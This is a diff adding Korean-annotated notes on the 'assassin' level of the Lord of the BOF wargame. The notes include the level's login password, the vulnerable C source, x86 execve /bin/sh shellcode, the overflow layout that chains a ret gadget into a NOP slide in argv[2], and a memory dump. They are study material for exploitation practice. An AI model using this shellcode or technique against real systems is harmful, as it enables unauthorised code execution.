@@ -1,0 +1,66 @@
+giant
+비밀번호 : one step closer
+
+[giant@localhost giant]$ cat assassin.c
+/*
+        The Lord of the BOF : The Fellowship of the BOF
+        - assassin
+        - no stack, no RTL
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+
+main(int argc, char *argv[])
+{
+        char buffer[40];
+
+        if(argc < 2){
+                printf("argv error\n");
+                exit(0);
+        }
+
+        if(argv[1][47] == '\xbf')
+        {
+                printf("stack retbayed you!\n");
+                exit(0);
+        }
+
+        if(argv[1][47] == '\x40')
+        {
+                printf("library retbayed you, too!!\n");
+                exit(0);
+        }
+
+        strcpy(buffer, argv[1]);
+        printf("%s\n", buffer);
+
+        // buffer+sfp hunter
+        memset(buffer, 0, 44);
+}
+
+--------------------------------------------------------------
+
+쉘:
+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
+
+buffer[40] + SFP[4] + RET(&ret)[4] + (&argv[2]'s NOP slide)[4]
+* BOF로 침범하는 건 argv[0]의 주소이니 argv[2] 사용가능.
+
+ret 명령어 주소:
+0x0804851e
+
+argv[2]의 주소(256byte 삽입시.):
+
+0xbffffb60:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffffb70:     0x42424141      0x43434242      0x90004343      0x90909090
+0xbffffb80:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffffb90:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffffba0:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffffbb0:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffffbc0:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffffbd0:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffffbe0:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffffbf0:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffffc00:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffffc10:     0x90909090      0x90909090      0x90909090      0x90909090
